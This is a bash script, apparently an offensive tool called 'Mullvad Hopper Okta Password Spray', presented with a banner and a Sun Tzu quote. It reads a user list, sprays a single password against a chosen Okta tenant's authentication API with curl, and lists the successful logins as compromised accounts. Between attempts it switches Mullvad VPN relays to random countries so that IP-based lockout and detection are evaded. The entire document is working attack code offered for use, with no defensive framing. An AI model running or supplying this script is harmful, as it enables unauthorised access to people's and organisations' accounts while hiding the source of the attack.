#!/bin/bash

echo "
  ooooooo  oooo   oooo ooooooooooo   o            oooooooo8 ooooo ooooooooooo  ooooooo8 ooooooooooo 
o888   888o 888  o88   88  888  88  888          888         888   888    88 o888    88  888    88  
888     888 888888         888     8  88          888oooooo  888   888ooo8   888    oooo 888ooo8    
888o   o888 888  88o       888    8oooo88                888 888   888    oo 888o    88  888    oo  
  88ooo88  o888o o888o    o888o o88o  o888o      o88oooo888 o888o o888ooo8888 888ooo888 o888ooo8888 
   
   '...wait by the river long enough, the bodies of your enemies will float by' -Sun Tzu
   
   
   [Mullvad Hopper Okta Password Spray by s3lrius]
   
   "                                                                                                    


if [[ "$1" == "" || "$2" == "" || "$3" == "" || "$4" == "" ]]; then
  echo "Usage: $0 <user_file> <password> <delay_seconds> <okta_tenant>"
  exit
fi

echo "Are you using Mullvad to hop locations? (y/n)"
read mullvad_response

if [[ "$mullvad_response" =~ ^[Yy]$ ]]; then
  echo "Paste your Mullvad account ID here:"
  read mullvad_account_id

  mullvad account login "$mullvad_account_id"

  if [[ "$?" -ne 0 ]]; then
    echo "Failed to log into Mullvad."
    exit
  fi

  echo "Successfully logged into Mullvad."
fi

password="$2"
delay_seconds="$3"
okta_tenant="$4"

compromised=()
successful=0
total=0

while IFS= read -r user || [[ -n "$user" ]]; do
  response=$(curl -s -o /dev/null -w "%{http_code}" "https://$okta_tenant.okta.com/api/v1/authn" \
    -H "Accept: application/json" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$user\",\"password\":\"$password\"}")

  if [[ "$response" -eq 200 ]]; then
    echo -e "\033[32m$user: Success\033[0m"
    successful=$((successful+1))
    compromised+=("$user")
  else
    echo -e "\033[31m$user: Failure\033[0m"
  fi

  if [[ "$mullvad_response" =~ ^[Yy]$ ]]; then
    location=$(shuf -n 1 -e "au" "at" "be" "br" "bg" "ca" "hr" "cz" "dk" "ee" "fi" "fr" "de" "gr" "hk" "hu" "ie" "il" "it" "jp" "lv" "lu" "md" "nl" "nz" "no" "pl" "pt" "ro" "rs" "sg" "sk" "za" "es" "se" "ch" "us")

    while true; do
      output=$(mullvad relay set location "$location" 2>&1)
      if [[ "$?" -eq 0 && "$output" == "Relay constraints updated"* ]]; then
        echo "Location changed to: $location"
        break
      else
        echo "Failed to change location to: $location"
        echo "Disconnecting from Mullvad then we will attempt to change our relay again..."
        mullvad disconnect
      fi
    done
  fi

  total=$((total+1))
  sleep "$delay_seconds"

done < "$1"

echo ""
echo "Spray resulted in $successful of $total correct passwords. The following user accounts have been compromised:"
printf '%s\n' "${compromised[@]}"




